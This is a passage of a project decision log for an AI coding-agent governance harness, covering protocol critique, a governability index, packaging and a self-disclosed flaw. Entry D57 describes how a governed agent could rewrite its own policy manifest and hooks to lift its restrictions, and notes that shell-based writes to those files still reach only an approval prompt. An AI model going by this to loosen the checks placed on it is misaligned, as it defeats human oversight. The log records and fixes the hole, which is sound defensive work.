+  only source of a confirmation requirement its type system can name is a model judge:
+
+  ```ts
+  /** Identifies a model judge as the source of a confirmation requirement. */
+  export const enum ToolCallRiskAssessmentKind { Judge = 'judge' }
+
+  export interface ToolCallRiskAssessmentCompleteState {
+    status: ToolCallRiskAssessmentStatus.Complete;
+    reason: StringOrMarkdown;
+    /** The judge's normalized safety score, where `0` is unsafe and `1` is safe. */
+    safety: number;
+  }
+  ```
+  <sub>`types/channels-chat/state.ts`</sub>
+
+  A single-variant enum, whose payload is a float. THESIS §2 states the objection directly:
+  *"if your security depends on a stochastic classifier being right 100% of the time, you are
+  already compromised."* This is the D52 prohibition — no probabilistic classifier in the trust
+  path — encoded as a protocol type, shipping, versioned, and pre-1.0. It is prior art that
+  disagrees with us **in its schema**, which is a sharper contrast than D27's AGT (where the
+  disagreement lives in an architecture note) and a strictly better foil for it.
+- **Decision, part 1 — disposition.** **Position-against (primary) + Incorporate (narrow,
+  gated).** Not Adopt-as-tool. AHP joins D27's shelf in `THIRD-PARTY-ADOPTION.md` and gets a
+  THESIS §8 paragraph. The differentiation is again **mechanism, not goal**: AHP escalates by
+  *score*, the border decides by *structure* — the dangerous capability is `ABSENT`, taint is
+  monotonic and provenanced, and no float appears anywhere in a verdict.
+- **Decision, part 2 — the one-way rule, which is the load-bearing half.** **AHP client state
+  may never become a kernel input.** The kernel may be a **source** of an AHP risk assessment;
+  it may never be a **consumer** of one. This is D52's rule on a new surface, and here it has a
+  second, independent justification: AHP clients are *multi-party*, and write-ahead
+  reconciliation means their local state is **optimistically divergent by design** — clients
+  apply their own actions before the host echoes them back. Optimism is correct for a UI and
+  disqualifying for a trust input.
+- **Decision, part 3 — AHP is not a governance seam.** Enforcement stays where D24/D34 put it:
+  the host PreToolUse seam, ACP, and the executor boundary. A verdict rendered into a
+  synchronized presentation state tree is *advisory*, and shipping one there would be governance
+  theatre of exactly the kind this project exists to name. Concretely: **no AHP dependency from
+  `world-kernel` or `harness-preview`**; if a fourth-host adapter ever lands it lives in
+  `cli-harness` behind a feature flag, like every other host.
+- **The fairness caveat, recorded here so the blog post cannot quietly drop it.** The judge
+  gates whether a **confirmation is requested**, not whether the call **executes**. It is an
+  escalation heuristic, not an enforcement decision, and "Microsoft ships classifier-based
+  enforcement" would be a false claim. The critique survives the correction — a mis-scored
+  escalation is a prompt that silently never appears, and a confirmation nobody was asked for
+  is indistinguishable from one nobody needed — but it must be *stated as the weaker claim it
+  is*. `detbench` learned this the expensive way (a headline that inverted once the defended
+  variant ran); the same discipline binds here **before** publication rather than after.
+- **Two more type-level findings, both already met elsewhere in this project.**
+  - `ToolCallConfirmationReason.Setting` — "Approved by a persistent user setting." The
+    **cache-satisfiable ask**, promoted to a protocol enum. Already met as Antigravity's stored
+    "Always Allow" and answered by D48's `force_ask` default. A protocol-level `Setting` means
+    an approval can be satisfied by a past decision rather than a present human, and nothing in
+    the state distinguishes the two after the fact.
+  - `editedToolInput` on `ChatToolCallApprovedAction` — a client may **modify the tool's input
+    parameters while approving them**. Approval and mutation arrive in one action, so the thing
+    approved is not necessarily the thing proposed. TOCTOU-shaped; treat as a research note, not
+    a finding, until reproduced.
+- **Recorded as unverified. None of these may appear in public writing until checked.**
+  (a) Whether *any* connected client may approve a tool call — `ChatToolCallConfirmed` is
+  `@clientDispatchable` and no per-client authorization model was found, but absence of evidence
+  in a spec read is not evidence of absence. (b) Whether a third party can host AHP or interpose
+  on the VS Code reference server at all — this gates the adapter entirely. (c) Whether the judge
+  is enabled by default in the reference implementation. There is also **no threat-model document
+  in the repository**; the only trust discussion (`docs/guide/mcp.md`) concerns sandboxing the
+  MCP UI View, and terminals document no approval gate.
+- **Alternatives rejected.**
+  - *Ignore it, per the doctrine's own layering.* Rejected on D27(b)'s reasoning — silence cedes
+    the comparison that **is** the contribution — and more so here, because the disagreement is
+    in a type rather than a design note.
+  - *Adopt AHP now as the structured ASK transport.* Genuinely tempting: elicitation and
+    `ConfirmationOption[]` are the structured ask channel OpenCode lacks entirely (D35) and
+    Antigravity satisfies from cache (D48). Rejected on sequencing and on part 3 — the seam is
+    unverified, and moving the approval channel into the presentation plane before a
+    deterministic assessment variant exists means speaking a protocol that can only express a
+    float.
+  - *Build the fourth host adapter first.* Rejected: the upstream proposal is only landable
+    **pre-1.0**, and an adapter shipped ahead of it inherits the schema it was meant to change.
+  - *Fork or vendor.* No. Same rule as every other entry in `THIRD-PARTY-ADOPTION.md`.
+- **Sequenced actions.** Wave 0 (now): this entry; the `THIRD-PARTY-ADOPTION.md` row; THESIS §8;
+  the blog post, leading with the fairness caveat; Flywheel discovery cases for `Setting` and
+  `editedToolInput` against the three live hosts. Wave 1 (gated): an upstream proposal adding a
+  **second `ToolCallRiskAssessmentKind`** — a deterministic/policy variant carrying
+  `{rule_id, manifest_hash, decision}` in place of `safety: number` — plus a paper-only
+  `GateResponse` → AHP mapping (ASK → `pending-confirmation` + `ConfirmationOption[]`; DENY →
+  `ToolCallCancellationReason.Denied`; ABSENT → never advertised, which is where D51's "the world
+  owns the surface it publishes" lands, since the MCP channel's capability advertisement is a
+  real surface-shaping mechanism). Wave 2 (only if Wave 1 lands and (b) above resolves): a fourth
+  host in `tests/one_kernel.rs`.
+- **Known residual: the protocol is pre-1.0 and says so.** Breaking changes are expected. Unlike
+  D48's `agy` contract — reverse-engineered from a shipped binary — this one is vendor-published,
+  versioned, and MIT, which is better footing, not stable footing.
+- **Review condition.** If the upstream proposal is declined or ignored by **2026-11-06**, drop
+  to Position-against only and do not build the adapter: without a deterministic variant, a
+  conformant integration would be required to represent kernel verdicts as a safety float, which
+  part 2 forbids.
+- **Caveat: the acronym is contested.** At least three other agent-space protocols call
+  themselves AHP (two "Agent Handoff", one "Agent Handshake"), and Analytic Hierarchy Process
+  dominates the plain search. Expand on first use in any public writing — the same hygiene D27
+  requires for the AGT / "Agent Hypervisor" collision.
+- **Related:** D24, D27, D34, D40, D48, D51, D52; THESIS §2, §3, §8; `STRATEGY.md` (witness over
+  depth); [`docs/THIRD-PARTY-ADOPTION.md`](docs/THIRD-PARTY-ADOPTION.md);
+  <https://github.com/microsoft/agent-host-protocol> · <https://microsoft.github.io/agent-host-protocol/>
+
+## D54 — `agentic-coding-lab` is a second outbound instrument: capability-first distribution, governed by the same one-way rule
+
+**Date:** 2026-08-06. **Extends** D52 (which added the *outbound instrument* as a fifth
+role in D40's topology) by putting a **second** artifact in that role rather than
+inventing a sixth. Constrained by D40 (one live implementation), `STRATEGY.md` (witness
+over depth), and THESIS §3.
+
+- **Context.** D52 established that an artifact built to be *found* — live, public, aimed
+  at an audience that has never heard of the thesis, never a dependency of the
+  implementation — is a legitimate fifth role. `detbench` occupies it by attacking the
+  detection question. A second gap is larger and closer to home: the people who use
+  Claude Code, Codex CLI, OpenCode and Antigravity every day are searching for
+  *effectiveness* — skills, subagents, MCP setups, workflows — not for governance. The
+  cluster has a governance kernel and no capability-first surface at all. Every artifact
+  that makes an agent more effective also makes it reach further, so the two subjects are
+  the same subject approached from the side the audience is actually standing on.
+- **Decision.** `agentic-coding-lab` is **its own repo in D52's fifth role**: experiments,
+  articles and copyable artifacts (skills, plugins, subagents, hooks, MCP configs) for
+  agentic software development, each shipped with an honest account of its reach. It is a
+  **consumer of `ai2rules`** and nothing else. Created locally 2026-08-06 (`e53f047`); no
+  remote yet, deliberately — see the residual on publishing below.
+- **The one-way rule, again the load-bearing half.** `agentic-coding-lab` may depend on,
+  cite and configure `ai2rules`. **`ai2rules` may never depend on it**, and **nothing
+  produced there may become an input to a governance decision** — not a runtime-written
+  rule, not a heuristic feeding a verdict, not a "trusted artifact" list the kernel
+  consults. Identical in shape to D52's detector prohibition and justified identically:
+  the kernel's claim is that a decision is a pure function of `(intent, context, compiled
+  world)`, and a convenience artifact with a vote converts a deterministic decision into a
+  negotiable one.
+- **The differentiator, which constrains the build and so is recorded here.** The
+  contract is *"an artifact may not describe itself as safer than it is."* Three tiers —
+  **0 unenforced** (prose advice, nothing checks it), **1 overlay** (ships deny/ask rules
+  atop the host's permissions; **fails open**), **2 structural** (the capability is
+  `ABSENT` from the compiled world, or mediated by the fail-closed `mcp-gateway`). A tier
+  ≥ 1 claim must ship the file that does the enforcing, and CI rejects it otherwise. An
+  artifact nobody has run must carry `> **Unverified.**` on its own front page.
+  This is D52's referee discipline applied to a different sport: the honest label is the
+  product, and "hardened"/"sandboxed"/"safe" are exactly the words that would earn stars
+  and forfeit the position.
+- **Why not inside `ai2rules`.** Rejected for D52's reasons plus one of its own: a
+  capability-first artifact buried in a Rust governance workspace inverts the funnel. The
+  reader arrives for the skill and meets the thesis on the way out; that only works if the
+  skill is the front door. It would also drag a content repo's cadence into a workspace
+  whose CI gates a kernel.
+- **Why not a directory in `detbench`, or a shared "content" repo.** Different audience,
+  different instrument. D52 archived-by-precedent the habit of merging things that merely
+  rhyme.
+- **Alternatives rejected.**
+  - *Publish the recipes as blog posts only.* The upstream blog is argument-first and its
+    reader is being persuaded of a position. A recipe's reader wants to go faster today.
+    Recorded as an explicit article split in the new repo's charter: if deleting the
+    governance section leaves a useful article, it belongs there; if it leaves nothing, it
+    belongs on the blog.
+  - *Ship a starter pack of artifacts immediately, to look alive.* Rejected by the repo's
+    own contract on its first commit — none had been run. `artifacts/` therefore holds a
+    template and nothing else, which is the honest state and is said plainly in its README.
+  - *Make the tier check advisory.* Rejected: an unenforced honesty rule in a repo whose
+    entire pitch is enforced honesty is the failure this cluster spends its time naming in
+    others.
+- **What was verified, and what was not.** The template's `world.yaml` is a real manifest
+  compiled by the real kernel; five verdicts were checked against `harness gate` on both a
+  debug and a release build with identical results (`ALLOW Read`; `ASK Bash_destructive`;
+  `ABSENT WebFetch / unknown_to_ontology`; `DENY Bash_network / taint_invariant` when
+  tainted; `ALLOW Bash_network` when clean), manifest hash `8629c6be6c12`. **Not
+  verified:** any end-to-end artifact, because none exists yet. Manifest verification is
+  local-only — that repo's CI does not build Rust, by design.
+- **Known residual: nothing is published.** *(Amended 2026-08-06, hours after this entry
+  landed — the original text said "the repo is local, has no remote".)* It now has one:
+  `sv-pro/agentic-coding-lab`, **private**, `origin` only, no GitLab mirror — matching
+  `ai-detector-bench` rather than this repo's dual-remote setup. Private is not published,
+  so the residual stands rather than closes: **an outbound instrument that is not outbound
+  is not yet doing its job.** It still has no LICENSE, and a repo whose point is that
+  people copy things out of it is unusable without one. Both remain open calls, not
+  oversights; the license one is cluster-wide (`ai2rules` and `ai-detector-bench` carry
+  none either). The two come due together — going public is the gate that forces the
+  license question, and the first verified artifact is the event that should trigger it.
+- **✅ Residual closed 2026-08-08. Both halves, together, as this entry predicted — but the
+  trigger was not the one named.** `sv-pro/agentic-coding-lab` is **public**, and all three
+  repos carry **MIT** (`ai2rules` `44d6b0c`, `ai-detector-bench` `c97956f`,
+  `agentic-coding-lab` `6b49c18`; copyright Sergey Vlasov). The event that forced it was
+  **D55**, not a verified artifact: the Governability Index shipped publicly one day earlier
+  with its *Contributing a measurement* section pointing at procedures inside a private repo.
+  That is not a broken link — **it is D55's conflict-of-interest firewall failing in
+  practice**, since the index's entire defence is that a stranger can check it without our
+  tooling, and no stranger could read the procedures at all. Verified after the change: an
+  unauthenticated fetch of the probe README returns 200.
+  **Two things worth keeping from how this closed.** First, D54 and D55 landed a day apart
+  and *neither noticed that the second made the first's open residual load-bearing* — an
+  entry can convert another entry's known gap into a live defect without either author
+  seeing it, which is an argument for reconciling the decision log against the artifacts, not
+  only against itself. Second, licensing was never the small half: `ai2rules` had declared
+  `MIT OR Apache-2.0` in `Cargo.toml` since E0, inherited by all ten crates, **with neither
+  license file ever in the tree** — a grant asserted in metadata with no text to accept.
+  *(Amended later the same day — the first pass narrowed this to MIT-only to match the
+  siblings; see the correction below.)*
+- **Correction, 2026-08-08: `ai2rules` keeps the dual grant. The cluster is not
+  single-licensed, and that asymmetry is the decision.** The MIT-only narrowing was reverted
+  on the owner's call: `Cargo.toml` declares `MIT OR Apache-2.0` again, and the repo now ships
+  **both texts** — `LICENSE-MIT` and `LICENSE-APACHE` — per the Rust ecosystem convention that
+  the metadata always implied. The siblings stay **MIT-only**, deliberately.
+  **The split follows the roles D52 and D54 already assigned.** The outbound instruments are
+  content and tools meant to be *copied out of*, where one permissive license with a minimal
+  attribution burden is the entire point; two license files at the root of a recipe repo is
+  friction against its only job. `ai2rules` is the one artifact someone might build a product
+  **on top of**, and that reader is the one who needs an explicit patent grant — which MIT does
+  not provide and Apache-2.0 does. **A licensing choice is a distribution choice, so it should
+  follow the topology rather than be applied uniformly for tidiness.** Uniformity was the whole
+  argument for MIT-everywhere, and it was the wrong axis.
+  **Known cost, measured rather than predicted, because it will look like a regression:**
+  GitHub resolves the pair to **`Apache-2.0`** — its API returns that single SPDX id, sourced
+  from `LICENSE-APACHE`, and the repo page reports "Apache-2.0, MIT licenses found". So the
+  badge *understates* the grant by naming the stricter option and hiding the MIT one. **This
+  is the ecosystem-standard outcome, not a misconfiguration: `rust-lang/rust` resolves
+  identically** (verified 2026-08-08 — same SPDX id, same source file). A first draft of this
+  entry predicted `NOASSERTION`; that was a guess and it was wrong, which is recorded here
+  because the number of times this project has been bitten by an unverified assumption is now
+  its own pattern. Not a reason to collapse back to one file.
+- **Known residual: this is a *seventh* live thing in a cluster that archived eight repos
+  to stop exactly this.** So the kill condition is stated up front, per D52's practice:
+  **if there is no verified artifact and no published experiment by 2027-02-06, archive it**
+  with a README pointer to `ai2rules`.
+- **Related:** D24, D33, D40, D47, D48, D51, D52; THESIS §3, §6; `STRATEGY.md` (witness
+  over depth); `scripts/install-governance.sh`; `docs/harness-gate-abi.md`.
+
+## D55 — The Governability Index is public and structural; no parameter may require our own tooling to answer
+
+**Date:** 2026-08-07. **Executes** `STRATEGY.md`'s second ranked bet (the governability
+index) and **applies D54's split** — definitions here, measurement recipes in the lab.
+Constrained by D24 (the host-neutral seam is what makes cross-host comparison legible at
+all) and by D52's referee discipline, which this entry extends to a second sport.
+
+- **Context.** `STRATEGY.md` ranks a governability index second among the open bets, on
+  two arguments: a ranking travels further than a demo, and whoever defines the benchmark
+  defines the category. It stayed unbuilt because its first criterion — "can one portable
+  manifest govern it" — is a claim about *our* product, which makes the benchmark look
+  like an advertisement. The unlock was noticing that **the presence or absence of a
+  pre-execution hook is itself a benchmark parameter**: structural, binary, vendor-owned,
+  and answerable by anyone in five minutes. That reframes the whole instrument away from
+  "how well does our manifest govern host X" and toward "what does host X let *anybody*
+  control".
+- **Decision.** The **Agent Governability Index** is a public artifact.
+  `docs/GOVERNABILITY-INDEX.md` owns the **parameter definitions, the methodology and the
+  results table**; `agentic-coding-lab/artifacts/governability-probe` owns the
+  **procedures**. Nine parameters at v0 (G1 intercept · G2 deny · G3 grant · G4 MCP+native
+  coverage · G5 cache-satisfiable approval · G6 absent-vs-denied · G7 post-execution
+  observation · G8 file-based config · G9 live reload). Shipped `cd37364` / `49d5c88`.
+- **The load-bearing constraint — the conflict-of-interest firewall.** **No parameter may
+  require `ai2rules` to answer.** We build a governance harness for the hosts this index
+  scores; an index whose cells can only be filled with our tooling is marketing wearing a
+  table's clothes. If a proposed parameter cannot be checked by someone who has never
+  heard of us, it does not go in — *however discriminating it is*. This is the rule that
+  makes the rest of the instrument survivable, and it is the first thing to check when
+  adding a parameter.
+- **Second constraint — the index measures the product, never the model.** Every parameter
+  is a yes/no question about what the host *permits*, answerable without running an agent
+  task. Admitting one behavioural parameter ("how well does it resist injection") would
+  reimport everything the structural design exists to exclude: model non-determinism,
+  prompt sensitivity, a shelf life of weeks, and irreproducibility. The value here is
+  precisely that a result from March is still a result in November.
+- **Third constraint — `?` is a publishable state and a guess is a defect.** Confidence is
+  a load-bearing column, as in `MAP.md`: `✓` observed by us, `○` documented but not run,
+  `?` unknown. The Codex and Copilot columns are entirely `?` on publication. "We looked
+  and did not find a hook" is **not** a measurement and may not be published as a `no`.
+- **No composite score. Ever.** A single "governability score" would be exactly the sin
+  `detbench` was built to name — AUROC averaging away the decision anyone actually makes
+  (D52). Per-parameter cells only. A reader who wants one number wants a number that
+  hides which of the nine they should have cared about.
+- **The disclosure is structural, not a footer.** The COI statement opens the document,
+  before the parameters, with the three constraints above stated as consequences of it.
+  Buried, such a disclosure reads as a liability; first, it reads as the reason to trust
+  what follows. Also recorded there: a low score is **not** a claim that a host is bad —
+  governability is orthogonal to quality, and the index says nothing about how good an
+  assistant is.
+- **Two parameters were discovered by building the instruments, not by design.** G8
+  (file-based config) came from finding that UI-configured connectors are invisible to
+  tooling that cannot even report them as missing. G9 (live reload) came from measuring
+  that Claude Code reads hook config live rather than snapshotting it at session start —
+  the opposite of what we had assumed and stated twice. This is §6's flywheel behaving as
+  advertised, and it is the argument for keeping the procedures and the definitions in
+  different repos with real users in between.
+- **Alternatives rejected.**
+  - *Keep it internal.* An index nobody can check is not a benchmark, and witness is the
+    binding constraint (`STRATEGY.md`).
+  - *One repo for both halves.* Rejected on D54: definitions are positioning and belong
+    with the thesis; procedures are practitioner content and belong in the lab. Putting
+    the table in the lab would also invert the direction of *authority* — the lab is the
+    consumer.
+  - *Lead with "can one portable manifest govern it".* That criterion is real and stays in
+    `STRATEGY.md` as a product thesis, but as parameter G0 it would fail the COI firewall
+    on its first line.
+  - *Score the hosts.* See above.
+- **Known residual, and the deepest one: we chose the nine questions.** The firewall
+  guarantees each parameter is *independently answerable*; it does not guarantee the
+  *selection* is neutral. Nine parameters drawn from our own architecture will
+  systematically favour hosts shaped like the seam we integrate with. There is no clean
+  fix, so the mitigation is procedural: publish proposed parameters that were rejected and
+  why, and treat an outside parameter proposal as higher-priority than an outside
+  measurement.
+- **Known residual: the conventions have no mechanical enforcement.** Dates, host
+  versions, `?`-not-guess, observed-vs-documented — all are review discipline. Unlike the
+  lab's artifact contract, no CI check can verify that a cell's evidence is real.
+- **Known residual: this is the first cluster artifact that names competitors in a scored
+  table.** D27 and D53 argue positions against named products, which is ordinary technical
+  writing. Assigning cells is a different exposure: a wrong cell is a false claim about
+  someone's product, and the correction cost falls on them.
+- **Review condition.** If by **2027-02-07** no third party has contributed a measurement
+  or contested a cell, the index is a monologue rather than a benchmark — and a benchmark
+  nobody engages with is marketing after all. At that point either retire it or hand the
+  definitions to someone with no product in the category.
+- **Related:** D24, D27, D33, D37, D40, D48 (`force_ask` — the finding behind G5), D51,
+  D52 (referee discipline; no composite score), D53, D54; THESIS §6; `STRATEGY.md` (bet 2);
+  [`docs/GOVERNABILITY-INDEX.md`](docs/GOVERNABILITY-INDEX.md);
+  <https://github.com/sv-pro/agentic-coding-lab>
+
+## D56 — `harness init`: the binary carries its own templates, so adoption needs no checkout
+
+**Date:** 2026-08-09. **Executes `STRATEGY.md`'s first ranked bet** (the productization
+wedge), deferred five times. Constrained by D37 (the shim holds no governance logic; the
+governed project is untrusted) and by the `roots` primitive (#27, #28), which is what makes
+a *generic* starter manifest worth installing at all.
+
+- **Context.** `scripts/install-governance.sh` already governed a project in one command,
+  and almost nobody could run it. It needed an **ai2rules checkout** for `--source`
+  (templates), **`cargo` or a prebuilt binary** to install a kernel, and **`jq`** to merge
+  `settings.json`. Those are three prerequisites in front of a pitch whose entire claim is
+  *"kill one concrete fear in five minutes"*. The script is fine; the distribution was the
+  product problem, and the strategy has said so since 2026-07-23.
+- **Decision.** `harness init [TARGET]` is a first-class subcommand that governs a project
+  using **nothing but the binary being invoked**. Three choices carry it, and each removes
+  exactly one prerequisite:
+  1. **The starter manifest is `include_str!`-ed into the executable.** No checkout.
+  2. **The shim bakes `std::env::current_exe()`.** No separate install step — the trusted
+     absolute path D37 requires is simply the binary the user just ran.
+  3. **The settings merge is `serde_json`.** No `jq`.
+  Flags: `--grant` (replace mode), `--force` (replace a tuned manifest), `--dry-run`.
+- **The manifest is compiled before it is written, and this is not a nicety.** `init` runs
+  the real compiler over the embedded template and writes nothing if it fails. A project
+  whose thesis is that governance must be *checkable* does not get to install a manifest it
+  never checked; shipping an unbuildable one to a stranger would be the exact failure this
+  repo spends its time naming in other people's tools.
+- **Idempotence is a security property here, not a convenience.** A duplicated `PreToolUse`
+  entry runs the kernel twice per call and doubles latency, which is how a governance tool
+  becomes the reason someone disables governance. Merging is keyed on the hook's `command`
+  string, foreign hooks and unrelated settings keys are preserved untouched, and a tuned
+  `cc-world.yaml` is never replaced without `--force` — losing that file is the worst thing
+  this command could do, because it is the only artifact in a governed project that
+  represents human judgement.
+- **Alternatives rejected.**
+  - *Keep improving the shell script.* It cannot remove its own prerequisites: the
+    templates live in the checkout by construction, and installing a binary is a separate
+    step no matter how the script is written.
+  - *Fetch templates from GitHub at init time.* Rejected on the thesis. A governance tool
+    that downloads its policy at install time makes the network a trust dependency of the
+    trust boundary, and an offline machine is exactly where this should still work.
+  - *Generate the manifest from the project (language detection, etc.).* Rejected for now:
+    inference is how a deterministic tool acquires a stochastic dependency. A fixed,
+    roots-confined starter that the user then tunes keeps the judgement human and visible.
+  - *Have `init` install the binary onto `PATH` too.* Rejected — that is the per-machine
+    half and belongs to the packaging layer (npm, brew, releases), not to a project-scoped
+    command. `install-governance.sh` keeps that half.
+- **✅ Residual closed 2026-08-10: the packaging half shipped.**
+  [`ai2rules-harness`](https://www.npmjs.com/package/ai2rules-harness) **`0.1.1`** is on the
+  public registry — unscoped, zero dependencies, with a `postinstall` that resolves a
+  checksum-verified prebuilt from the `v0.1.1` GitHub release. Verified cold from the
+  registry: `npx ai2rules-harness init` governs a fresh directory and returns a deny verdict
+  for a write outside it. **The agent did not publish it** — a package name is a one-way
+  door, so the `npm publish` was left to a human even after everything else was staged and
+  the login was in place.
+  **Unscoped rather than `@ai2rules/harness`, decided at publish time:** the `@ai2rules`
+  org did not exist on npm, so the scoped name would have failed *after* login rather than
+  before it, and creating an org to hold one package buys nothing. `npx ai2rules-harness
+  init` reads the same.
+- **New residual, found by running the published package: under `npx`, the shim bakes a
+  path that can disappear.** `init` records the absolute path of the binary that ran it
+  (that is what makes the trusted-path requirement of D37 free). Under `npx` that path is
+  inside npm's transient `_npx` cache; when the cache is cleaned the binary is gone and the
+  shim **fails open** — the host silently returns to its own permissions with no error.
+  Fail-open is the correct behaviour for a missing kernel (D37) and this does not change it,
+  but it makes `npx` the wrong *durable* install, so both READMEs now recommend
+  `npm install -g` and describe `npx` as the way to try it. **The real fix, if this bites
+  anyone: have the shim report a missing kernel once instead of failing silently** — but
+  that trades a silent hole for a possible per-call warning, which is a design call and not
+  a bug fix.
+- **Related:** D24 (host-neutral gate ABI), D33/D37 (the cc-hook seam and the untrusted
+  project directory), D47, `scripts/starter-world.yaml`, `docs/TUTORIAL.md`, `STRATEGY.md`
+  (bet 1), and `crates/cli-harness/tests/init.rs` (14 tests — including that the embedded
+  manifest cannot drift from the shipped one, and five regressions from the 2026-08-09
+  review, each verified to fail against the pre-fix code).
+
+## D57 — The control plane is read-only to the agent; policy changes are *proposed*, and merged only by deterministic non-agent tools
+
+**Date:** 2026-08-11. **Forced by a working exploit**, reported from real use and reproduced
+here. Constrained by THESIS §2 (no stochastic component in the trust path), D37 (the governed
+project is untrusted input), and E11 (the World Authoring Tool, which this entry gives a second
+job).
+
+- **The vulnerability.** `.claude/` sat inside the project's own writable root, so an agent
+  under governance could rewrite the policy binding it. Measured, not inferred:
+  `Write`/`Edit` against `.claude/cc-world.yaml`, `.claude/hooks/world-gate.sh` and
+  `.claude/settings.json` all returned **silent ALLOW — not even ASK**. Flipping one roots rule
+  from `Read` to `ReadWrite` moved a `/etc` write from `DENY` to `ALLOWED` **on the very next
+  tool call.**
+- **Why `CompiledWorld` immutability did not save us, which was the assumption worth killing.**
+  The invariant is real but scoped to a single decision. The shim runs
+  `harness cc-hook --world .claude/cc-world.yaml` as a **fresh process per tool call**, so the
+  manifest is recompiled every time. There is no "takes effect next session" — there is no
+  session. An earlier note in `NEXT.md` speculated immutability might blunt this; it does not,
+  and that speculation is retracted here.
+- **Decision, part 1 — the control plane is `Read`.** The shipped starter manifest gains one
+  rule: `- { path: "./.claude", access: Read }`, in the same "out of bounds even inside an
+  allowed parent" block as `~/.ssh` and `/etc/shadow`. Structured writes to the manifest, the
+  shim and the hook registration now **DENY**.
+- **Read stays allowed, deliberately.** An agent that cannot see its own rules cannot explain a
+  denial or propose a sensible change to one, and opacity buys nothing here — the manifest is
+  committed to the repo anyway. Secrecy is not the property being defended; **write authority
+  is.**
+- **Decision, part 2 — the sanctioned path is a *proposal*, not an edit.** Removing write access
+  must not remove the useful workflow ("loosen this rule so I can finish"). The agent may emit a
+  **patch** against the manifest; that patch is inert until merged by a **deterministic,
+  non-agent, user-facing tool** — the World Authoring Tool (E11, `harness serve`) being the
+  obvious host, since it already compiles manifests with the real compiler and already puts a
+  human in front of the result.
+  **This is the project's own propose/decide split applied one level up.** A `ToolCall` is a
+  proposal until `IRBuilder::build` seals it; a manifest patch is a proposal until a human-driven
+  deterministic tool merges it. The model's authority over policy becomes exactly what its
+  authority over execution already is: **it may ask, and nothing it writes takes effect by
+  itself.**
+  Proposals live **outside `.claude/`** (the whole directory is read-only, and a carve-out is a
+  path-traversal target — this repo has fixed that class twice, #36 and #37). Implementation is
+  deliberately not specified here beyond that constraint.
+- **Known residual, stated because it is the obvious next question: the shell path is `ASK`, not
+  `DENY`.** Path scoping keys on the `file_path` argument of structured tools. `sed -i`,
+  `echo >`, `cat >` and `rm` against the same files are classified as commands and land on
+  approval-required. A human is in the loop, which is a categorical improvement on silent allow,
+  but it is not a block. Closing it properly means the kernel understanding write targets inside
+  shell commands — which is a real piece of work and belongs to its own entry, not to a
+  parenthesis in this one.
+- **Alternatives rejected.**
+  - *Hash-pin the manifest in the shim.* Makes tampering loud rather than impossible, and adds a
+    second source of truth that drifts the moment someone legitimately edits the manifest.
+  - *Move the manifest out of the project.* Closes it, and forfeits the property that makes a
+    manifest worth having: policy committed alongside the code it governs, reviewed in the same
+    pull request.
+  - *Deny reads too.* Rejected above — costs the proposal workflow and buys no secrecy.
+  - *A privileged MCP tool that edits the manifest.* Rejected as the primary mechanism. It is
+    strictly worse than the file write it replaces: advertised in `tools/list`, therefore the
+    first thing an injection enumerating tools will find, and certain to be allow-listed for
+    convenience. If one is ever built it needs all four of — direct writes closed, edits applying
+    only on the next compile, manifest edits denied under taint as a **kernel** invariant (a
+    manifest rule protecting the manifest is circular), and a human-minted approval token
+    (`ApprovalStore`, E6) the model cannot forge.
+- **Related:** D37 (untrusted project directory), D47, E6 (`ApprovalStore`), E11 (the authoring
+  tool that gains the merge role), #27/#28 (`roots`), #36/#37 (path canonicalization — the class
+  a `.claude/` carve-out would reopen), `scripts/starter-world.yaml`, and
+  `crates/cli-harness/tests/init.rs` (three tests: writes denied, reads allowed, ordinary project
+  writes unaffected).
+
+## D58 — The npm package ships per-platform binaries as optional dependencies, and runs no install script
+
+**Date:** 2026-08-11. **Amends D56's packaging half.** Prompted by an outside signal —
+Socket.dev scored `ai2rules-harness` **64% on supply chain security** — and the score was
+correct.
+
+- **The uncomfortable part first.** The package existed to distribute a governance kernel,
+  and its own install did this: run a `postinstall`, `fetch()` a binary from the internet,
+  unpack it with `spawnSync('tar')`, `chmod 0o755`, and leave it ready to execute. That is
+  a close description of the attack class supply-chain scanners exist to catch. A scanner
+  cannot tell our download from a hostile one and should not try. **The score was not a
+  false positive; it was a correct reading of behaviour we had chosen.**
+- **The real weakness underneath the score, which matters more than the number.** The
+  checksum was fetched from the *same host, at the same moment,* as the artifact it
+  verified. That proves the file arrived intact. It says nothing about whether it is the
+  right file: anyone able to replace the binary could replace the digest beside it. **That
+  is integrity, not provenance** — the distinction this project spends its time drawing
+  everywhere else.
+- **Decision.** Four platform packages — `ai2rules-harness-{linux-x64,darwin-x64,darwin-arm64,win32-x64}`
+  — each containing one prebuilt binary and declaring `os`/`cpu`. The wrapper lists them in
+  `optionalDependencies`; npm resolves exactly one and skips the rest. **The wrapper has no
+  `scripts` block at all.** `bin/harness.js` resolves the binary at runtime via
+  `require.resolve`, which works across npm/pnpm/yarn layouts.
+  Consequences, in the order they matter: no install-time network, shell, or chmod; the
+  binary is covered by the integrity hash npm writes into the *consumer's* lockfile; and
+  publishing moves into CI with `--provenance`, signing each tarball against the workflow
+  and commit that produced it. Installs also become reproducible, offline-cacheable, and
+  usable behind a proxy or mirrored registry — none of which was true before.
+- **A hole this restructure exposed rather than created.** With the binary in
+  `node_modules`, `harness init` was baking a kernel path **inside the project it governs**.
+  Measured: `Write` to that path returns ALLOW, and swapping in a no-op makes every verdict
+  vanish. The same was true of `0.1.1`'s `vendor/harness`; nobody had looked. **`init` now
+  refuses when the resolved binary is inside the target project** (`--force` overrides, for
+  read-only mounts and immutable images). This is the third instance of one pattern —
+  `gate-off`, the manifest, and now the kernel itself — and the pattern is worth stating
+  once: **anything the enforcement depends on must live outside what it enforces upon.**
+- **Not score-gaming, and the distinction is checkable.** Every change here removes a
+  capability rather than hiding one. If the signals were suppressed but the behaviour kept,
+  `npm/verify-packages.js` would still pass and the package would still fetch at install
+  time. It does not, because there is no install script to fetch from.
+- **Alternatives rejected.**
+  - *Keep the `postinstall` and document it.* Documentation does not remove the capability,
+    and the capability is the finding.
+  - *Bundle all platforms' binaries in one package.* ~4 MB × 4 for every install, and every
+    consumer downloads three binaries they cannot execute.
+  - *Vendor the binary into the wrapper as base64.* Same size problem, plus it defeats
+    npm's per-platform resolution and makes diffs unreadable.
+  - *Publish under a scope for tidiness.* The `@ai2rules` org does not exist and creating
+    one to hold five packages buys nothing; D56 already settled unscoped naming.
+- **Known residual: five packages must version in lockstep**, and a skew resolves to
+  nothing rather than failing loudly. `npm/verify-packages.js` fails CI on skew, on a
+  reintroduced install script, and on a platform shipped but not built — the three failures
+  that are otherwise silent and land on someone else's machine.
